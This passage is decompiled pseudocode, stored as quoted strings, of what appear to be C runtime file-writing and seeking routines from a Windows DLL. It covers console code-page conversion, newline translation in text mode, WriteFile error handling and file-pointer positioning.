    "  __int64 v46; // [rsp+68h] [rbp-51h] BYREF",
    "  UINT ConsoleOutputCP; // [rsp+70h] [rbp-49h]",
    "  int v48; // [rsp+74h] [rbp-45h]",
    "  unsigned __int8 *v49; // [rsp+78h] [rbp-41h]",
    "  __int64 v50; // [rsp+80h] [rbp-39h]",
    "  __int64 v51; // [rsp+88h] [rbp-31h] BYREF",
    "  _BYTE *v52; // [rsp+90h] [rbp-29h] BYREF",
    "  unsigned __int8 *v53; // [rsp+98h] [rbp-21h] BYREF",
    "  HANDLE hFile; // [rsp+A0h] [rbp-19h]",
    "  __int64 v55; // [rsp+A8h] [rbp-11h]",
    "  __int64 v56; // [rsp+B0h] [rbp-9h]",
    "  _BYTE v57[8]; // [rsp+B8h] [rbp-1h] BYREF",
    "  _BYTE v58[8]; // [rsp+C0h] [rbp+7h] BYREF",
    "  char Buffer[8]; // [rsp+C8h] [rbp+Fh] BYREF",
    "",
    "  v56 = -2;",
    "  v5 = a3;",
    "  v49 = a3;",
    "  v6 = a2;",
    "  v45 = a5;",
    "  v8 = (__int64)a2 >> 6;",
    "  v50 = v8;",
    "  v9 = 9LL * (a2 & 0x3F);",
    "  hFile = *(HANDLE *)(qword_18004D870[v8] + 72LL * (a2 & 0x3F) + 40);",
    "  v10 = (unsigned __int64)&a3[a4];",
    "  v44 = v10;",
    "  ConsoleOutputCP = GetConsoleOutputCP();",
    "  v11 = 0;",
    "  v12 = a5;",
    "  if ( !*(_BYTE *)(a5 + 40) )",
    "  {",
    "    sub_180019E10(v45);",
    "    v12 = v45;",
    "  }",
    "  v13 = *(_DWORD *)(*(_QWORD *)(v12 + 24) + 12LL);",
    "  v48 = v13;",
    "  *(_QWORD *)a1 = 0;",
    "  *(_DWORD *)(a1 + 8) = 0;",
    "  if ( (unsigned __int64)v49 < v10 )",
    "  {",
    "    v14 = v6 >> 6;",
    "    v55 = v6 >> 6;",
    "    v15 = 0;",
    "    while ( 1 )",
    "    {",
    "      LOBYTE(v41[0]) = *v5;",
    "      v42 = 0;",
    "      v16 = 1;",
    "      if ( v13 == 65001 )",
    "      {",
    "        v17 = 0;",
    "        v18 = 0;",
    "        v19 = (_BYTE *)(qword_18004D870[v14] + 8 * v9 + 62);",
    "        do",
    "        {",
    "          if ( !*v19 )",
    "            break;",
    "          ++v17;",
    "          ++v18;",
    "          ++v19;",
    "        }",
    "        while ( v18 < 5 );",
    "        if ( v18 <= 0 )",
    "        {",
    "          v26 = byte_18004B4B0[*v5];",
    "          v27 = v44 - (_QWORD)v5;",
    "          if ( (int)v26 + 1 > (__int64)(v44 - (_QWORD)v5) )",
    "          {",
    "            if ( v27 > 0 )",
    "            {",
    "              v38 = 0;",
    "              v39 = v50;",
    "              do",
    "              {",
    "                *(_BYTE *)(v38 + qword_18004D870[v39] + 8 * v9 + 62) = v5[v38];",
    "                ++v11;",
    "                ++v38;",
    "              }",
    "              while ( v11 < v27 );",
    "            }",
    "            *(_DWORD *)(a1 + 4) += v27;",
    "            return a1;",
    "          }",
    "          v46 = 0;",
    "          v53 = v5;",
    "          v28 = ((_DWORD)v26 == 3) + 1;",
    "          if ( sub_18002FF04((unsigned int)&v42, (unsigned int)&v53, v28, (unsigned int)&v46, v12) == -1 )",
    "            return a1;",
    "          v5 += v26;",
    "          v16 = v28;",
    "          v8 = v50;",
    "        }",
    "        else",
    "        {",
    "          v20 = byte_18004B4B0[*(unsigned __int8 *)(qword_18004D870[v8] + 8 * v9 + 62)] + 1;",
    "          LODWORD(v46) = v20 - v17;",
    "          v21 = v44 - (_QWORD)v5;",
    "          v22 = (int)v46;",
    "          if ( (int)v46 > (__int64)(v44 - (_QWORD)v5) )",
    "          {",
    "            if ( v21 > 0 )",
    "            {",
    "              v37 = &v5[-v18];",
    "              do",
    "              {",
    "                *(_BYTE *)(v18 + qword_18004D870[v8] + 8 * v9 + 62) = v37[v18];",
    "                ++v11;",
    "                ++v18;",
    "              }",
    "              while ( v11 < v21 );",
    "            }",
    "            *(_DWORD *)(a1 + 4) += v21;",
    "            return a1;",
    "          }",
    "          v23 = 0;",
    "          v24 = (_BYTE *)(qword_18004D870[v14] + 8 * v9 + 62);",
    "          do",
    "            v57[v23++] = *v24++;",
    "          while ( v23 < v18 );",
    "          if ( v22 > 0 )",
    "          {",
    "            sub_180036160(&v57[v18], v5, v22);",
    "            v12 = v45;",
    "          }",
    "          for ( i = 0; i < v18; ++i )",
    "            *(_BYTE *)(i + qword_18004D870[v8] + 8 * v9 + 62) = 0;",
    "          v51 = 0;",
    "          v52 = v57;",
    "          v16 = (v20 == 4) + 1;",
    "          if ( sub_18002FF04((unsigned int)&v42, (unsigned int)&v52, v16, (unsigned int)&v51, v12) == -1 )",
    "            return a1;",
    "          v5 += (int)v46 - 1;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v29 = qword_18004D870[v8];",
    "        v30 = *(_BYTE *)(v29 + 8 * v9 + 61);",
    "        if ( (v30 & 4) != 0 )",
    "        {",
    "          v58[0] = *(_BYTE *)(v29 + 8 * v9 + 62);",
    "          v58[1] = *v5;",
    "          *(_BYTE *)(v29 + 8 * v9 + 61) = v30 & 0xFB;",
    "          v31 = 2;",
    "          v32 = v58;",
    "          goto LABEL_29;",
    "        }",
    "        v33 = *v5;",
    "        if ( *(__int16 *)(**(_QWORD **)(v12 + 24) + 2 * v33) >= 0 )",
    "        {",
    "          v31 = 1;",
    "          v32 = v5;",
    "LABEL_29:",
    "          if ( (unsigned int)sub_180025C34(&v42, v32, v31, v12) == -1 )",
    "            return a1;",
    "          goto LABEL_30;",
    "        }",
    "        if ( (unsigned __int64)(v5 + 1) >= v44 )",
    "        {",
    "          *(_BYTE *)(v29 + 8 * v9 + 62) = v33;",
    "          *(_BYTE *)(qword_18004D870[v8] + 8 * v9 + 61) |= 4u;",
    "          *(_DWORD *)(a1 + 4) = v15 + 1;",
    "          return a1;",
    "        }",
    "        if ( (unsigned int)sub_180025C34(&v42, v5, 2u, v12) == -1 )",
    "          return a1;",
    "        ++v5;",
    "      }",
    "LABEL_30:",
    "      ++v5;",
    "      v34 = sub_18002C260(ConsoleOutputCP, 0, (unsigned int)&v42, v16, (unsigned int)Buffer, 5, 0, 0);",
    "      v35 = v34;",
    "      if ( !v34 )",
    "        return a1;",
    "      v36 = hFile;",
    "      if ( !WriteFile(hFile, Buffer, v34, (LPDWORD)&NumberOfBytesWritten, 0) )",
    "      {",
    "LABEL_48:",
    "        *(_DWORD *)a1 = GetLastError();",
    "        return a1;",
    "      }",
    "      v15 = *(_DWORD *)(a1 + 8) + (_DWORD)v5 - (_DWORD)v49;",
    "      *(_DWORD *)(a1 + 4) = v15;",
    "      if ( (unsigned int)NumberOfBytesWritten < v35 )",
    "        return a1;",
    "      if ( LOBYTE(v41[0]) == 10 )",
    "      {",
    "        v41[0] = 13;",
    "        if ( !WriteFile(v36, v41, 1u, (LPDWORD)&NumberOfBytesWritten, 0) )",
    "          goto LABEL_48;",
    "        if ( !(_DWORD)NumberOfBytesWritten )",
    "          return a1;",
    "        ++*(_DWORD *)(a1 + 8);",
    "        v15 = ++*(_DWORD *)(a1 + 4);",
    "      }",
    "      if ( (unsigned __int64)v5 >= v44 )",
    "        return a1;",
    "      v12 = v45;",
    "      v14 = v55;",
    "      v13 = v48;",
    "    }",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180028A10(__int64 a1, int a2, char *a3, int a4)",
    "{",
    "  unsigned __int64 v5; // rbp",
    "  char *v6; // rsi",
    "  void *v7; // r14",
    "  char *v8; // rbx",
    "  char v9; // al",
    "  DWORD v10; // ebx",
    "  DWORD v11; // eax",
    "  DWORD v13; // [rsp+30h] [rbp-1438h] BYREF",
    "  _BYTE v14[5119]; // [rsp+40h] [rbp-1428h] BYREF",
    "  char v15; // [rsp+143Fh] [rbp-29h] BYREF",
    "",
    "  v5 = (unsigned __int64)&a3[a4];",
    "  v6 = a3;",
    "  v7 = *(void **)(qword_18004D870[(__int64)a2 >> 6] + 72LL * (a2 & 0x3F) + 40);",
    "  *(_QWORD *)a1 = 0;",
    "  *(_DWORD *)(a1 + 8) = 0;",
    "  if ( (unsigned __int64)a3 < v5 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v8 = v14;",
    "      do",
    "      {",
    "        if ( (unsigned __int64)v6 >= v5 )",
    "          break;",
    "        v9 = *v6++;",
    "        if ( v9 == 10 )",
    "        {",
    "          ++*(_DWORD *)(a1 + 8);",
    "          *v8++ = 13;",
    "        }",
    "        *v8++ = v9;",
    "      }",
    "      while ( v8 < &v15 );",
    "      v10 = (_DWORD)v8 - (unsigned int)v14;",
    "      if ( !WriteFile(v7, v14, v10, &v13, 0) )",
    "        break;",
    "      v11 = v13;",
    "      *(_DWORD *)(a1 + 4) += v13;",
    "      if ( v11 < v10 || (unsigned __int64)v6 >= v5 )",
    "        return a1;",
    "    }",
    "    *(_DWORD *)a1 = GetLastError();",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180028B14(__int64 a1, int a2, __int16 *a3, unsigned int a4)",
    "{",
    "  unsigned __int64 v5; // rbp",
    "  __int16 *v6; // rsi",
    "  void *v7; // r14",
    "  char *v8; // rbx",
    "  __int16 v9; // ax",
    "  DWORD v10; // ebx",
    "  DWORD v11; // eax",
    "  DWORD v13; // [rsp+30h] [rbp-1438h] BYREF",
    "  _BYTE v14[5118]; // [rsp+40h] [rbp-1428h] BYREF",
    "  __int16 v15; // [rsp+143Eh] [rbp-2Ah] BYREF",
    "",
    "  v5 = (unsigned __int64)a3 + a4;",
    "  v6 = a3;",
    "  v7 = *(void **)(qword_18004D870[(__int64)a2 >> 6] + 72LL * (a2 & 0x3F) + 40);",
    "  *(_QWORD *)a1 = 0;",
    "  *(_DWORD *)(a1 + 8) = 0;",
    "  if ( (unsigned __int64)a3 < v5 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v8 = v14;",
    "      do",
    "      {",
    "        if ( (unsigned __int64)v6 >= v5 )",
    "          break;",
    "        v9 = *v6++;",
    "        if ( v9 == 10 )",
    "        {",
    "          *(_DWORD *)(a1 + 8) += 2;",
    "          *(_WORD *)v8 = 13;",
    "          v8 += 2;",
    "        }",
    "        *(_WORD *)v8 = v9;",
    "        v8 += 2;",
    "      }",
    "      while ( v8 < (char *)&v15 );",
    "      v10 = 2 * ((v8 - v14) >> 1);",
    "      if ( !WriteFile(v7, v14, v10, &v13, 0) )",
    "        break;",
    "      v11 = v13;",
    "      *(_DWORD *)(a1 + 4) += v13;",
    "      if ( v11 < v10 || (unsigned __int64)v6 >= v5 )",
    "        return a1;",
    "    }",
    "    *(_DWORD *)a1 = GetLastError();",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180028C30(__int64 a1, int a2, __int16 *a3, unsigned int a4)",
    "{",
    "  unsigned __int64 v5; // r14",
    "  int v6; // r15d",
    "  __int16 *v7; // rdi",
    "  void *v8; // r12",
    "  bool v9; // cf",
    "  char *v10; // rax",
    "  __int16 v11; // cx",
    "  unsigned int v12; // ebp",
    "  unsigned int v13; // esi",
    "  DWORD v15; // [rsp+40h] [rbp-1458h] BYREF",
    "  _BYTE v16[1704]; // [rsp+50h] [rbp-1448h] BYREF",
    "  char v17; // [rsp+6F8h] [rbp-DA0h] BYREF",
    "  struct _OVERLAPPED v18; // [rsp+700h] [rbp-D98h] BYREF",
    "",
    "  v5 = (unsigned __int64)a3 + a4;",
    "  v6 = (int)a3;",
    "  v7 = a3;",
    "  v8 = *(void **)(qword_18004D870[(__int64)a2 >> 6] + 72LL * (a2 & 0x3F) + 40);",
    "  *(_QWORD *)a1 = 0;",
    "  v9 = (unsigned __int64)a3 < v5;",
    "  *(_DWORD *)(a1 + 8) = 0;",
    "LABEL_2:",
    "  if ( v9 )",
    "  {",
    "    v10 = v16;",
    "    do",
    "    {",
    "      if ( (unsigned __int64)v7 >= v5 )",
    "        break;",
    "      v11 = *v7++;",
    "      if ( v11 == 10 )",
    "      {",
    "        *(_WORD *)v10 = 13;",
    "        v10 += 2;",
    "      }",
    "      *(_WORD *)v10 = v11;",
    "      v10 += 2;",
    "    }",
    "    while ( v10 < &v17 );",
    "    v12 = sub_18002C260(65001, 0, (unsigned int)v16, (v10 - v16) >> 1, (unsigned int)&v18, 3413, 0, 0);",
    "    if ( v12 )",
    "    {",
    "      v13 = 0;",
    "      while ( WriteFile(v8, (char *)&v18 + v13, v12 - v13, &v15, 0) )",
    "      {",
    "        v13 += v15;",
    "        if ( v13 >= v12 )",
    "        {",
    "          *(_DWORD *)(a1 + 4) = (_DWORD)v7 - v6;",
    "          v9 = (unsigned __int64)v7 < v5;",
    "          goto LABEL_2;",
    "        }",
    "      }",
    "    }",
    "    *(_DWORD *)a1 = GetLastError();",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180028DA0(__int64 a1, __int64 a2, __int64 a3)",
    "{",
    "  unsigned int v3; // edi",
    "  int v4; // ebx",
    "  int v5; // ebx",
    "  _QWORD v7[2]; // [rsp+20h] [rbp-40h] BYREF",
    "  char v8; // [rsp+30h] [rbp-30h]",
    "  __int128 v9; // [rsp+38h] [rbp-28h]",
    "  char v10; // [rsp+48h] [rbp-18h]",
    "  int v11; // [rsp+4Ch] [rbp-14h]",
    "  char v12; // [rsp+50h] [rbp-10h]",
    "  int v13; // [rsp+54h] [rbp-Ch]",
    "  char v14; // [rsp+58h] [rbp-8h]",
    "",
    "  v7[0] = 0;",
    "  v8 = 0;",
    "  v10 = 0;",
    "  v12 = 0;",
    "  v14 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v10 = 1;",
    "    v9 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v3 = sub_180028E38(a1, a2, a3, v7);",
    "  if ( v10 == 2 )",
    "    *(_DWORD *)(v7[0] + 936LL) &= ~2u;",
    "  if ( v12 )",
    "  {",
    "    v4 = v11;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v7) + 32) = v4;",
    "  }",
    "  if ( v14 )",
    "  {",
    "    v5 = v13;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v7) + 36) = v5;",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180028E38(unsigned int a1, __int64 a2, unsigned int a3, __int64 a4)",
    "{",
    "  BOOL v8; // eax",
    "  __int64 v9; // r15",
    "  unsigned int v10; // r14d",
    "",
    "  if ( a1 == -2 )",
    "  {",
    "    *(_BYTE *)(a4 + 56) = 1;",
    "    *(_DWORD *)(a4 + 52) = 0;",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    *(_DWORD *)(a4 + 44) = 9;",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  v8 = (a1 & 0x80000000) == 0 && a1 < dword_18004DC70;",
    "  if ( !v8 || (v9 = (__int64)(int)a1 >> 6, (*(_BYTE *)(qword_18004D870[v9] + 72LL * (a1 & 0x3F) + 56) & 1) == 0) )",
    "  {",
    "    *(_BYTE *)(a4 + 56) = 1;",
    "    *(_DWORD *)(a4 + 52) = 0;",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    *(_DWORD *)(a4 + 44) = 9;",
    "    sub_18001A598(0, 0, 0, 0, 0, a4);",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  sub_18002E1BC(a1);",
    "  v10 = -1;",
    "  if ( (*(_BYTE *)(qword_18004D870[v9] + 72LL * (a1 & 0x3F) + 56) & 1) != 0 )",
    "  {",
    "    v10 = sub_180028F58(a1, a2, a3, a4);",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    *(_DWORD *)(a4 + 44) = 9;",
    "    *(_BYTE *)(a4 + 56) = 1;",
    "    *(_DWORD *)(a4 + 52) = 0;",
    "  }",
    "  sub_18002E2A4(a1);",
    "  return v10;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180028F58(int a1, _BYTE *a2, unsigned int a3, __int64 a4)",
    "{",
    "  int v4; // edi",
    "  __int64 v5; // r14",
    "  __int64 v10; // rax",
    "  __int64 v11; // r12",
    "  __int64 v12; // r13",
    "  __int64 v13; // rcx",
    "  unsigned __int16 *v14; // r12",
    "  unsigned __int16 *v15; // r15",
    "  int v16; // r14d",
    "  __int64 v17; // rax",
    "  __int64 v18; // xmm0_8",
    "  __int64 v19; // rcx",
    "  void *v20; // rcx",
    "  char v21; // [rsp+30h] [rbp-48h]",
    "  __int16 v22; // [rsp+30h] [rbp-48h]",
    "  __int64 NumberOfBytesWritten; // [rsp+38h] [rbp-40h] BYREF",
    "  int v24; // [rsp+40h] [rbp-38h]",
    "  __int64 v25; // [rsp+48h] [rbp-30h]",
    "  PCONTEXT Mode; // [rsp+58h] [rbp-20h] BYREF",
    "  __int64 v27; // [rsp+60h] [rbp-18h]",
    "",
    "  v4 = 0;",
    "  v5 = a3;",
    "  if ( !a3 )",
    "    return 0;",
    "  if ( !a2",
    "    || (v10 = a1 & 0x3F,",
    "        v11 = (__int64)a1 >> 6,",
    "        v27 = v11,",
    "        v12 = 9 * v10,",
    "        v13 = qword_18004D870[v11],",
    "        v21 = *(_BYTE *)(v13 + 72 * v10 + 57),",
    "        (unsigned __int8)(v21 - 1) <= 1u)",
    "    && (a3 & 1) != 0 )",
    "  {",
    "    *(_BYTE *)(a4 + 56) = 1;",
    "    *(_DWORD *)(a4 + 52) = 0;",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    *(_DWORD *)(a4 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a4);",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  if ( (*(_BYTE *)(v13 + 72 * v10 + 56) & 0x20) != 0 )",
    "    sub_18002956C((unsigned int)a1, 0, 2, a4);",
    "  v25 = 0;",
    "  if ( !isatty(a1) || *(char *)(qword_18004D870[v11] + 8 * v12 + 56) >= 0 )",
    "    goto LABEL_30;",
    "  if ( !*(_BYTE *)(a4 + 40) )",
    "    sub_180019E10(a4);",
    "  if ( !*(_QWORD *)(*(_QWORD *)(a4 + 24) + 312LL) && !*(_BYTE *)(qword_18004D870[v11] + 8 * v12 + 57)",
    "    || !GetConsoleMode(*(HANDLE *)(qword_18004D870[v11] + 8 * v12 + 40), (LPDWORD)&Mode) )",
    "  {",
    "LABEL_30:",
    "    v19 = qword_18004D870[v11];",
    "    if ( *(char *)(v19 + 8 * v12 + 56) >= 0 )",
    "    {",
    "      v20 = *(void **)(v19 + 8 * v12 + 40);",
    "      NumberOfBytesWritten = 0;",
    "      v24 = 0;",
    "      if ( !WriteFile(v20, a2, v5, (LPDWORD)&NumberOfBytesWritten + 1, 0) )",
    "        LODWORD(NumberOfBytesWritten) = GetLastError();",
    "      v4 = v24;",
    "LABEL_40:",
    "      v18 = NumberOfBytesWritten;",
    "      goto LABEL_41;",
    "    }",
    "    if ( v21 )",
    "    {",
    "      if ( v21 == 1 )",
    "      {",
    "        v17 = sub_180028C30((__int64)&NumberOfBytesWritten, a1, (__int16 *)a2, v5);",
    "      }",
    "      else",
    "      {",
    "        if ( v21 != 2 )",
    "          goto LABEL_42;",
    "        v17 = sub_180028B14((__int64)&NumberOfBytesWritten, a1, (__int16 *)a2, v5);",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v17 = sub_180028A10((__int64)&NumberOfBytesWritten, a1, a2, v5);",
    "    }",
    "LABEL_29:",
    "    v18 = *(_QWORD *)v17;",
    "    v4 = *(_DWORD *)(v17 + 8);",
    "LABEL_41:",
    "    v25 = v18;",
    "    goto LABEL_42;",
    "  }",
    "  if ( !v21 )",
    "  {",
    "    v17 = sub_180028598((__int64)&NumberOfBytesWritten, a1, a2, v5, a4);",
    "    goto LABEL_29;",
    "  }",
    "  if ( (unsigned int)(v21 - 1) <= 1 )",
    "  {",
    "    v14 = (unsigned __int16 *)&a2[v5];",
    "    NumberOfBytesWritten = 0;",
    "    v15 = (unsigned __int16 *)a2;",
    "    if ( a2 < &a2[v5] )",
    "    {",
    "      v16 = HIDWORD(NumberOfBytesWritten);",
    "      while ( 1 )",
    "      {",
    "        v22 = *v15;",
    "        if ( (unsigned __int16)sub_1800329E0(*v15) != v22 )",
    "          break;",
    "        v16 += 2;",
    "        HIDWORD(NumberOfBytesWritten) = v16;",
    "        if ( v22 == 10 )",
    "        {",
    "          if ( (unsigned __int16)sub_1800329E0(13) != 13 )",
    "            break;",
    "          HIDWORD(NumberOfBytesWritten) = ++v16;",
    "          ++v4;",
    "        }",
    "        if ( ++v15 >= v14 )",
    "          goto LABEL_27;",
    "      }",
    "      LODWORD(NumberOfBytesWritten) = GetLastError();",
    "    }",
    "LABEL_27:",
    "    v11 = v27;",
    "    goto LABEL_40;",
    "  }",
    "LABEL_42:",
    "  if ( HIDWORD(v25) )",
    "    return (unsigned int)(HIDWORD(v25) - v4);",
    "  if ( (_DWORD)v25 )",
    "  {",
    "    if ( (_DWORD)v25 == 5 )",
    "    {",
    "      *(_BYTE *)(a4 + 48) = 1;",
    "      *(_DWORD *)(a4 + 44) = 9;",
    "      *(_BYTE *)(a4 + 56) = 1;",
    "      *(_DWORD *)(a4 + 52) = 5;",
    "    }",
    "    else",
    "    {",
    "      sub_18001A7C8((unsigned int)v25, a4);",
    "    }",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  if ( (*(_BYTE *)(qword_18004D870[v11] + 8 * v12 + 56) & 0x40) == 0 || *a2 != 26 )",
    "  {",
    "    *(_DWORD *)(a4 + 52) = 0;",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    *(_DWORD *)(a4 + 44) = 28;",
    "    *(_BYTE *)(a4 + 56) = 1;",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180029260(unsigned int a1, __int64 a2, unsigned int a3, __int64 a4)",
    "{",
    "  BOOL v8; // eax",
    "  __int64 v9; // r15",
    "  __int64 v10; // r14",
    "",
    "  if ( a1 == -2 )",
    "  {",
    "    *(_BYTE *)(a4 + 56) = 1;",
    "    *(_DWORD *)(a4 + 52) = 0;",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    *(_DWORD *)(a4 + 44) = 9;",
    "    return -1;",
    "  }",
    "  v8 = (a1 & 0x80000000) == 0 && a1 < dword_18004DC70;",
    "  if ( !v8 || (v9 = (__int64)(int)a1 >> 6, (*(_BYTE *)(qword_18004D870[v9] + 72LL * (a1 & 0x3F) + 56) & 1) == 0) )",
    "  {",
    "    *(_BYTE *)(a4 + 56) = 1;",
    "    *(_DWORD *)(a4 + 52) = 0;",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    *(_DWORD *)(a4 + 44) = 9;",
    "    sub_18001A598(0, 0, 0, 0, 0, a4);",
    "    return -1;",
    "  }",
    "  sub_18002E1BC(a1);",
    "  v10 = -1;",
    "  if ( (*(_BYTE *)(qword_18004D870[v9] + 72LL * (a1 & 0x3F) + 56) & 1) != 0 )",
    "  {",
    "    v10 = sub_180029380(a1, a2, a3, a4);",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    *(_DWORD *)(a4 + 44) = 9;",
    "    *(_BYTE *)(a4 + 56) = 1;",
    "    *(_DWORD *)(a4 + 52) = 0;",
    "  }",
    "  sub_18002E2A4(a1);",
    "  return v10;",
    "}",
    "",
    "",
    "LARGE_INTEGER __fastcall sub_180029380(unsigned int a1, LARGE_INTEGER a2, DWORD a3, __int64 a4)",
    "{",
    "  __int64 v4; // rdi",
    "  void *v8; // rax",
    "  LARGE_INTEGER result; // rax",
    "  DWORD LastError; // eax",
    "  LARGE_INTEGER NewFilePointer[3]; // [rsp+20h] [rbp-18h] BYREF",
    "",
    "  v4 = (int)a1;",
    "  v8 = (void *)sub_18002E4C8(a1);",
    "  if ( v8 == (void *)-1LL )",
    "  {",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    *(_DWORD *)(a4 + 44) = 9;",
    "    return (LARGE_INTEGER)-1LL;",
    "  }",
    "  if ( !SetFilePointerEx(v8, a2, NewFilePointer, a3) )",
    "  {",
    "    LastError = GetLastError();",
    "    sub_18001A7C8(LastError, a4);",
    "    return (LARGE_INTEGER)-1LL;",
    "  }",
    "  result = NewFilePointer[0];",
    "  if ( NewFilePointer[0].QuadPart == -1 )",
    "    return (LARGE_INTEGER)-1LL;",
    "  *(_BYTE *)(qword_18004D870[v4 >> 6] + 72 * (v4 & 0x3F) + 56) &= ~2u;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002942C(unsigned int a1, __int64 a2, unsigned int a3)",
    "{",
    "  __int64 v3; // rdi",
    "  int v4; // ebx",
    "  int v5; // ebx",
    "  _QWORD v7[2]; // [rsp+20h] [rbp-40h] BYREF",
    "  char v8; // [rsp+30h] [rbp-30h]",
    "  __int128 v9; // [rsp+38h] [rbp-28h]",
    "  char v10; // [rsp+48h] [rbp-18h]",
    "  int v11; // [rsp+4Ch] [rbp-14h]",
    "  char v12; // [rsp+50h] [rbp-10h]",
    "  int v13; // [rsp+54h] [rbp-Ch]",
    "  char v14; // [rsp+58h] [rbp-8h]",
    "",
    "  v7[0] = 0;",
    "  v8 = 0;",
    "  v10 = 0;",
    "  v12 = 0;",
    "  v14 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v10 = 1;",
    "    v9 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v3 = sub_180029260(a1, a2, a3, (__int64)v7);",
    "  if ( v10 == 2 )",
    "    *(_DWORD *)(v7[0] + 936LL) &= ~2u;",
    "  if ( v12 )",
    "  {",
    "    v4 = v11;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v7) + 32) = v4;",
    "  }",
    "  if ( v14 )",
    "  {",
    "    v5 = v13;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v7) + 36) = v5;",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "LARGE_INTEGER __fastcall sub_1800294D0(unsigned int a1, LARGE_INTEGER a2, DWORD a3)",
    "{",
    "  LARGE_INTEGER v3; // rdi",
    "  int v4; // ebx",
    "  int v5; // ebx",
    "  _QWORD v7[2]; // [rsp+20h] [rbp-40h] BYREF",
    "  char v8; // [rsp+30h] [rbp-30h]",
    "  __int128 v9; // [rsp+38h] [rbp-28h]",
    "  char v10; // [rsp+48h] [rbp-18h]",
    "  int v11; // [rsp+4Ch] [rbp-14h]",
    "  char v12; // [rsp+50h] [rbp-10h]",
    "  int v13; // [rsp+54h] [rbp-Ch]",
    "  char v14; // [rsp+58h] [rbp-8h]",
    "",
    "  v7[0] = 0;",
    "  v8 = 0;",
    "  v10 = 0;",
    "  v12 = 0;",
    "  v14 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v10 = 1;",
    "    v9 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v3 = sub_180029380(a1, a2, a3, (__int64)v7);",
    "  if ( v10 == 2 )",
    "    *(_DWORD *)(v7[0] + 936LL) &= ~2u;",
    "  if ( v12 )",
    "  {",
    "    v4 = v11;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v7) + 32) = v4;",
    "  }",
    "  if ( v14 )",
    "  {",
    "    v5 = v13;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v7) + 36) = v5;",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "// attributes: thunk",
    "LARGE_INTEGER __fastcall sub_18002956C(unsigned int a1, LARGE_INTEGER a2, DWORD a3, __int64 a4)",
    "{",
    "}__int64 __fastcall sub_180029574(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v5; // rdi",
    "",
    "  if ( a1 )",
    "  {",
    "    sub_180017470(a1);",
    "    v5 = sub_1800295E0(a1, a2);",
    "    sub_18001747C(a1);",
    "    return v5;",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(a2 + 48) = 1;",
    "    *(_DWORD *)(a2 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a2);",
    "    return -1;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800295E0(__int64 a1, __int64 a2)",
    "{",
    "  unsigned int v5; // eax",
    "  __int64 v6; // rsi",
    "  __int64 v7; // r11",
    "  __int64 *v8; // r8",
    "  unsigned __int64 v9; // r10",
    "  __int64 v10; // rcx",
    "  __int64 v11; // rdx",
    "  char v12; // si",
    "  __int64 v13; // rax",
    "  __int64 v14; // r10",
    "",
    "  if ( !a1 )",
    "  {",
    "    *(_BYTE *)(a2 + 48) = 1;",
    "    *(_DWORD *)(a2 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a2);",
    "    return -1;",
    "  }",
    "  v5 = sub_180025DAC(a1);",
    "  v6 = (int)v5;",
    "  if ( *(int *)(a1 + 16) < 0 )",
    "    *(_DWORD *)(a1 + 16) = 0;",
    "  v7 = sub_1800294C8(v5, 0, 1, a2);",
    "  if ( v7 < 0 )",
    "    return -1;",
    "  if ( (*(_DWORD *)(a1 + 20) & 0xC0) == 0 )",
    "    return v7 - *(int *)(a1 + 16);",
    "  v8 = qword_18004D870;",
    "  v9 = *(_QWORD *)a1 - *(_QWORD *)(a1 + 8);",
    "  v10 = v6 >> 6;",
    "  v11 = 9 * (v6 & 0x3F);",
    "  v12 = *(_BYTE *)(qword_18004D870[v6 >> 6] + 72 * (v6 & 0x3F) + 57);",
    "  if ( (*(_DWORD *)(a1 + 20) & 3) != 0 )",
    "  {",
    "    if ( v12 == 1 && (*(_BYTE *)(qword_18004D870[v10] + 8 * v11 + 61) & 2) != 0 )",
    "      return sub_18002988C(a1, v7, a2);",
